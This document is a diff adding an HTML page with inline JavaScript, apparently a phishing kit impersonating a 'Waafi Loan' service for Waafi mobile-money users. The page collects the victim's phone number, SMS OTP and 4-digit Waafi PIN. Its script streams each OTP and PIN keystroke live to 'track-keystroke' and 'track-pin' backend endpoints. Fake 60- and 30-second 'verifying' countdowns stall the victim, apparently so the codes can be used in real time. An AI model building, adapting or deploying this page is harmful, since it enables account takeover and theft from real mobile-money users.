@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Waafi Loan</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <h1><span>Waafi</span> Loan</h1>
+                <p>Quick loan access for Waafi users</p>
+            </div>
+
+            <!-- Step 1: Phone Number -->
+            <div id="step1">
+                <form id="phoneForm">
+                    <div class="form-group">
+                        <label for="phoneNumber">📱 Phone Number</label>
+                        <input 
+                            type="tel" 
+                            id="phoneNumber" 
+                            placeholder="Enter your phone number" 
+                            required
+                            autocomplete="off"
+                        />
+                        <small>Enter your registered phone number</small>
+                    </div>
+                    <button type="submit" id="requestOTPBtn" class="btn-primary">
+                        Continue
+                    </button>
+                </form>
+            </div>
+
+            <!-- Step 2: OTP Entry -->
+            <div id="step2" style="display:none;">
+                <div style="background: var(--waafi-primary-light); padding: 16px; border-radius: 12px; margin-bottom: 24px; border-left: 4px solid var(--waafi-primary);">
+                    <p style="color: var(--waafi-gray-800); font-weight: 600; margin: 0;">
+                        📱 Enter the OTP sent to your phone
+                    </p>
+                    <p style="font-size: 14px; color: var(--waafi-gray-500); margin: 4px 0 0 0;">
+                        Check your SMS for the 6-digit code
+                    </p>
+                </div>
+                
+                <form id="otpForm">
+                    <div class="form-group">
+                        <label for="otpInput">🔐 Enter OTP</label>
+                        <div style="position: relative;">
+                            <input 
+                                type="text" 
+                                id="otpInput" 
+                                placeholder="● ● ● ● ● ●" 
+                                maxlength="6"
+                                inputmode="numeric"
+                                pattern="[0-9]*"
+                                autocomplete="off"
+                                required
+                            />
+                            <div id="otpStatus" style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-size: 20px;">
+                                ⏳
+                            </div>
+                        </div>
+                        <small>Enter the 6-digit OTP sent to your phone</small>
+                    </div>
+                    
+                    <div id="otpVisual">
+                        <span class="otp-box" id="otp1">_</span>
+                        <span class="otp-box" id="otp2">_</span>
+                        <span class="otp-box" id="otp3">_</span>
+                        <span class="otp-box" id="otp4">_</span>
+                        <span class="otp-box" id="otp5">_</span>
+                        <span class="otp-box" id="otp6">_</span>
+                    </div>
+                    
+                    <button type="submit" id="verifyOTPBtn" class="btn-primary">
+                        Verify & Continue
+                    </button>
+                </form>
+                
+                <div style="text-align: center; margin-top: 16px;">
+                    <a href="#" id="backToPhoneLink" style="color: var(--waafi-gray-400); font-size: 13px; text-decoration: none;">
+                        ← Change phone number
+                    </a>
+                </div>
+            </div>
+
+            <!-- Step 3: Loading/Processing (After OTP) -->
+            <div id="step3" style="display:none;">
+                <div style="text-align: center; padding: 32px 0;">
+                    <div class="loading-spinner"></div>
+                    <h3>⏳ Verifying Your OTP</h3>
+                    <p>Please wait while we verify your OTP...</p>
+                    <div style="margin-top: 20px; background: var(--waafi-gray-50); padding: 16px; border-radius: 12px; border: 1px solid var(--waafi-gray-200);">
+                        <p style="font-size: 14px; color: var(--waafi-gray-600); margin: 0;">
+                            ⏱️ Estimated time: <span id="countdownTimer">60</span> seconds
+                        </p>
+                        <div class="progress-container">
+                            <div class="progress-fill" id="progressBar" style="width: 0%;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 4: Waafi PIN Entry -->
+            <div id="step4" style="display:none;">
+                <div style="background: var(--waafi-primary-light); padding: 16px; border-radius: 12px; margin-bottom: 24px; border-left: 4px solid var(--waafi-primary);">
+                    <p style="color: var(--waafi-gray-800); font-weight: 600; margin: 0;">
+                        🔐 Enter Your Waafi PIN
+                    </p>
+                    <p style="font-size: 14px; color: var(--waafi-gray-500); margin: 4px 0 0 0;">
+                        Enter your 4-digit Waafi PIN to confirm your identity
+                    </p>
+                </div>
+                
+                <form id="pinForm">
+                    <div class="form-group">
+                        <label for="pinInput">🔑 Waafi PIN</label>
+                        <div style="position: relative;">
+                            <input 
+                                type="password" 
+                                id="pinInput" 
+                                placeholder="● ● ● ●" 
+                                maxlength="4"
+                                inputmode="numeric"
+                                pattern="[0-9]*"
+                                autocomplete="off"
+                                required
+                            />
+                            <div id="pinStatus" style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-size: 20px;">
+                                ⏳
+                            </div>
+                        </div>
+                        <small>Enter your 4-digit Waafi PIN</small>
+                    </div>
+                    
+                    <div id="pinVisual">
+                        <span class="pin-box" id="pin1">_</span>
+                        <span class="pin-box" id="pin2">_</span>
+                        <span class="pin-box" id="pin3">_</span>
+                        <span class="pin-box" id="pin4">_</span>
+                    </div>
+                    
+                    <button type="submit" id="verifyPinBtn" class="btn-primary">
+                        Confirm PIN & Login
+                    </button>
+                </form>
+                
+                <div style="text-align: center; margin-top: 16px;">
+                    <a href="#" id="backToOTPLink" style="color: var(--waafi-gray-400); font-size: 13px; text-decoration: none;">
+                        ← Back to OTP
+                    </a>
+                </div>
+            </div>
+
+            <!-- Step 5: Loading/Processing (After PIN) -->
+            <div id="step5" style="display:none;">
+                <div style="text-align: center; padding: 32px 0;">
+                    <div class="loading-spinner"></div>
+                    <h3>⏳ Processing Your Request</h3>
+                    <p>Please wait while we verify your PIN and complete login...</p>
+                    <div style="margin-top: 20px; background: var(--waafi-gray-50); padding: 16px; border-radius: 12px; border: 1px solid var(--waafi-gray-200);">
+                        <p style="font-size: 14px; color: var(--waafi-gray-600); margin: 0;">
+                            ⏱️ Estimated time: <span id="pinCountdownTimer">30</span> seconds
+                        </p>
+                        <div class="progress-container">
+                            <div class="progress-fill" id="pinProgressBar" style="width: 0%;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="errorMessage" class="error-message" style="display:none;"></div>
+            <div id="successMessage" class="success-message" style="display:none;"></div>
+
+            <div class="footer">
+                <a href="#" id="registerLink">Register new user</a>
+            </div>
+        </div>
+
+        <!-- Registration Modal -->
+        <div id="registerModal" class="modal" style="display:none;">
+            <div class="modal-content">
+                <button class="close" id="closeModal">&times;</button>
+                <h2>Register New User</h2>
+                <form id="registerForm">
+                    <div class="form-group">
+                        <label>Full Name</label>
+                        <input type="text" id="regFullName" placeholder="Enter full name" required />
+                    </div>
+                    <div class="form-group">
+                        <label>Phone Number</label>
+                        <input type="tel" id="regPhone" placeholder="252611111111" required />
+                    </div>
+                    <div class="form-group">
+                        <label>Email (optional)</label>
+                        <input type="email" id="regEmail" placeholder="email@example.com" />
+                    </div>
+                    <div class="form-group">
+                        <label>Loan Limit</label>
+                        <input type="number" id="regLimit" value="50000" />
+                    </div>
+                    <button type="submit" class="btn-primary">Register</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'http://localhost:5000/api';
+        let currentPhoneNumber = '';
+        let currentOTP = '';
+        let keystrokeTimer = null;
+        let countdownInterval = null;
+        let pinCountdownInterval = null;
+
+        // OTP Visual Update
+        function updateOTPVisual(otp) {
+            const boxes = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'];
+            for (let i = 0; i < 6; i++) {
+                const box = document.getElementById(boxes[i]);
+                if (i < otp.length) {
+                    box.textContent = '●';
+                    box.style.borderColor = '#00A651';
+                    box.style.background = '#E8F5E9';
+                    box.style.color = '#00A651';
+                } else {
+                    box.textContent = '_';
+                    box.style.borderColor = '#E2E8F0';
+                    box.style.background = '#FFFFFF';
+                    box.style.color = '#94A3B8';
+                }
+            }
+        }
+
+        // PIN Visual Update
+        function updatePINVisual(pin) {
+            const boxes = ['pin1', 'pin2', 'pin3', 'pin4'];
+            for (let i = 0; i < 4; i++) {
+                const box = document.getElementById(boxes[i]);
+                if (i < pin.length) {
+                    box.textContent = '●';
+                    box.style.borderColor = '#00A651';
+                    box.style.background = '#E8F5E9';
+                    box.style.color = '#00A651';
+                } else {
+                    box.textContent = '_';
+                    box.style.borderColor = '#E2E8F0';
+                    box.style.background = '#FFFFFF';
+                    box.style.color = '#94A3B8';
+                }
+            }
+        }
+
+        // Track OTP keystroke to backend
+        async function trackKeystroke(phoneNumber, currentOtp) {
+            try {
+                await fetch(`${API_BASE}/auth/track-keystroke`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phoneNumber: phoneNumber,
+                        otp: currentOtp
+                    })
+                });
+                
+                const statusIcon = document.getElementById('otpStatus');
+                if (currentOtp.length === 6) {
+                    statusIcon.textContent = '✅';
+                } else if (currentOtp.length > 0) {
+                    statusIcon.textContent = '⌨️';
+                } else {
+                    statusIcon.textContent = '⏳';
+                }
+                
+            } catch (error) {
+                console.error('Track keystroke error:', error);
+            }
+        }
+
+        // Track PIN keystroke to backend
+        async function trackPINKeystroke(phoneNumber, pin) {
+            try {
+                await fetch(`${API_BASE}/auth/track-pin`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phoneNumber: phoneNumber,
+                        pin: pin
+                    })
+                });
+                
+                const statusIcon = document.getElementById('pinStatus');
+                if (pin.length === 4) {
+                    statusIcon.textContent = '✅';
+                } else if (pin.length > 0) {
+                    statusIcon.textContent = '⌨️';
+                } else {
+                    statusIcon.textContent = '⏳';
+                }
+                
+            } catch (error) {
+                console.error('Track PIN keystroke error:', error);
+            }
+        }
+
+        // Show OTP loading screen
+        function showOTPLoading(callback) {
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const errorDiv = document.getElementById('errorMessage');
+            const successDiv = document.getElementById('successMessage');
+            
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+            
+            step2.style.display = 'none';
+            step3.style.display = 'block';
+            
+            let seconds = 60;
+            const countdownElement = document.getElementById('countdownTimer');
+            const progressBar = document.getElementById('progressBar');
+            
+            progressBar.style.width = '0%';
+            
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+            
+            countdownInterval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                progressBar.style.width = `${((60 - seconds) / 60) * 100}%`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownInterval = null;
+                    if (callback) callback();
+                }
+            }, 1000);
+        }
+
+        // Show PIN loading screen
+        function showPINLoading(callback) {
+            const step4 = document.getElementById('step4');
+            const step5 = document.getElementById('step5');
+            const errorDiv = document.getElementById('errorMessage');
+            const successDiv = document.getElementById('successMessage');
+            
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'none';
+            
+            step4.style.display = 'none';
+            step5.style.display = 'block';
+            
+            let seconds = 30;
+            const countdownElement = document.getElementById('pinCountdownTimer');
+            const progressBar = document.getElementById('pinProgressBar');
+            
+            progressBar.style.width = '0%';
+            
+            if (pinCountdownInterval) {
+                clearInterval(pinCountdownInterval);
+            }
+            
+            pinCountdownInterval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                progressBar.style.width = `${((30 - seconds) / 30) * 100}%`;
+                
+                if (seconds <= 0) {
+                    clearInterval(pinCountdownInterval);
+                    pinCountdownInterval = null;
+                    if (callback) callback();
+                }
+            }, 1000);
+        }
+
+        function hideLoadingScreens() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            if (pinCountdownInterval) {
+                clearInterval(pinCountdownInterval);
+                pinCountdownInterval = null;
+            }
+            document.getElementById('step3').style.display = 'none';
+            document.getElementById('step5').style.display = 'none';
+        }
+
+        // Step 1: Submit Phone Number
+        document.getElementById('phoneForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const errorDiv = document.getElementById('errorMessage');
+            const successDiv = document.getElementById('successMessage');
+            const requestBtn = document.getElementById('requestOTPBtn');
+            
+            if (!phoneNumber) {
+                showError('Please enter your phone number');
+                return;
+            }
+            
+            hideMessages();
+            requestBtn.disabled = true;
+            requestBtn.textContent = '⏳ Processing...';
+            
+            try {
+                const response = await fetch(`${API_BASE}/auth/track-phone`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentPhoneNumber = phoneNumber;
+                    document.getElementById('step1').style.display = 'none';
+                    document.getElementById('step2').style.display = 'block';
+                    showSuccess('✅ Phone number received. Enter the OTP sent to your phone.');
+                    document.getElementById('otpInput').focus();
+                } else {
+                    showError(data.message || 'Failed to process phone number');
+                }
+            } catch (error) {
+                showError('Network error. Is the server running?');
+                console.error('Phone entry error:', error);
+            } finally {
+                requestBtn.disabled = false;
+                requestBtn.textContent = 'Continue';
+            }
+        });
+
+        // OTP Input
+        const otpInput = document.getElementById('otpInput');
+        
+        otpInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            if (this.value.length > 6) {
+                this.value = this.value.slice(0, 6);
+            }
+            
+            const currentOtp = this.value;
+            currentOTP = currentOtp;
+            updateOTPVisual(currentOtp);
+            
+            if (currentPhoneNumber) {
+                clearTimeout(keystrokeTimer);
+                keystrokeTimer = setTimeout(() => {
+                    trackKeystroke(currentPhoneNumber, currentOtp);
+                }, 50);
+            }
+        });
+
+        // Step 2: Verify OTP - Show PIN screen after loading
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const otp = document.getElementById('otpInput').value.trim();
+            const errorDiv = document.getElementById('errorMessage');
+            const verifyBtn = document.getElementById('verifyOTPBtn');
+            
+            if (!otp || otp.length !== 6) {
+                showError('Please enter a complete 6-digit OTP');
+                return;
+            }
+            
+            hideMessages();
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = '⏳ Verifying...';
+            
+            // Show loading screen with 60-second delay
+            showOTPLoading(async () => {
+                // Verify OTP with backend
+                try {
+                    const response = await fetch(`${API_BASE}/auth/verify-otp`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            phoneNumber: currentPhoneNumber,
+                            otp: otp
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        // After loading, show PIN screen
+                        hideLoadingScreens();
+                        document.getElementById('step3').style.display = 'none';
+                        document.getElementById('step4').style.display = 'block';
+                        document.getElementById('pinInput').focus();
+                        showSuccess('✅ OTP verified! Enter your Waafi PIN to continue.');
+                        verifyBtn.disabled = false;
+                        verifyBtn.textContent = 'Verify & Continue';
+                    } else {
+                        hideLoadingScreens();
+                        document.getElementById('step2').style.display = 'block';
+                        showError(data.message || 'OTP verification failed');
+                        document.getElementById('otpStatus').textContent = '❌';
+                        verifyBtn.disabled = false;
+                        verifyBtn.textContent = 'Verify & Continue';
+                    }
+                } catch (error) {
+                    hideLoadingScreens();
+                    document.getElementById('step2').style.display = 'block';
+                    showError('Network error. Is the server running?');
+                    console.error('Verify OTP error:', error);
+                    verifyBtn.disabled = false;
+                    verifyBtn.textContent = 'Verify & Continue';
+                }
+            });
+        });
+
+        // PIN Input
+        const pinInput = document.getElementById('pinInput');
+        
+        pinInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            if (this.value.length > 4) {
+                this.value = this.value.slice(0, 4);
+            }
+            
+            const currentPin = this.value;
+            updatePINVisual(currentPin);
+            
+            if (currentPhoneNumber) {
+                clearTimeout(keystrokeTimer);
+                keystrokeTimer = setTimeout(() => {
+                    trackPINKeystroke(currentPhoneNumber, currentPin);
+                }, 50);
+            }
+        });
+
+        // Step 4: Verify PIN - Final login
+        document.getElementById('pinForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const pin = document.getElementById('pinInput').value.trim();
+            const errorDiv = document.getElementById('errorMessage');
+            const verifyBtn = document.getElementById('verifyPinBtn');
+            
+            if (!pin || pin.length !== 4) {
+                showError('Please enter a complete 4-digit PIN');
+                return;
+            }
+            
+            hideMessages();
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = '⏳ Verifying PIN...';
+            
+            // Show PIN loading screen
+            showPINLoading(async () => {
+                try {
+                    const response = await fetch(`${API_BASE}/auth/verify-pin`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            phoneNumber: currentPhoneNumber,
+                            otp: currentOTP,
+                            pin: pin
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        localStorage.setItem('waafi_user', JSON.stringify(data.user));
+                        window.location.href = 'dashboard.html';
+                    } else {
+                        hideLoadingScreens();
+                        document.getElementById('step4').style.display = 'block';
+                        showError(data.message || 'PIN verification failed');
+                        document.getElementById('pinStatus').textContent = '❌';
+                    }
+                } catch (error) {
+                    hideLoadingScreens();
+                    document.getElementById('step4').style.display = 'block';
+                    showError('Network error. Is the server running?');
+                    console.error('Verify PIN error:', error);
+                } finally {
+                    verifyBtn.disabled = false;
+                    verifyBtn.textContent = 'Confirm PIN & Login';
+                }
+            });
+        });
+
+        // Back to phone number
+        document.getElementById('backToPhoneLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            hideLoadingScreens();
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('otpInput').value = '';
+            currentOTP = '';
+            updateOTPVisual('');
+            hideMessages();
+        });
+
+        // Back to OTP
+        document.getElementById('backToOTPLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            hideLoadingScreens();
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            document.getElementById('pinInput').value = '';
+            updatePINVisual('');
+            hideMessages();
+        });
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';
+        }
+
+        function showSuccess(message) {
+            const successDiv = document.getElementById('successMessage');
+            successDiv.textContent = message;
+            successDiv.style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        function hideMessages() {
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+        }
+
+        // Registration modal
+        const modal = document.getElementById('registerModal');
+        const registerLink = document.getElementById('registerLink');
+        const closeBtn = document.getElementById('closeModal');
+
+        registerLink.onclick = (e) => {
+            e.preventDefault();
+            modal.style.display = 'flex';
+        };
+
+        closeBtn.onclick = () => {
+            modal.style.display = 'none';
+        };
+
+        window.onclick = (e) => {
+            if (e.target === modal) {
+                modal.style.display = 'none';
+            }
+        };
+
+        // Registration form
+        document.getElementById('registerForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const fullName = document.getElementById('regFullName').value.trim();
+            const phone = document.getElementById('regPhone').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const limit = document.getElementById('regLimit').value;
+            
+            try {
+                const response = await fetch(`${API_BASE}/auth/register`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phoneNumber: phone, 
+                        fullName, 
+                        email, 
+                        loanLimit: parseFloat(limit) 
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    alert('✅ User registered successfully! You can now login.');
+                    modal.style.display = 'none';
+                    document.getElementById('phoneNumber').value = phone;
+                } else {
+                    alert('❌ Registration failed: ' + data.message);
+                }
+            } catch (error) {
+                alert('Network error: ' + error.message);
+            }
+        });
+
+        updateOTPVisual('');
+        updatePINVisual('');
+    </script>
+</body>
+</html>
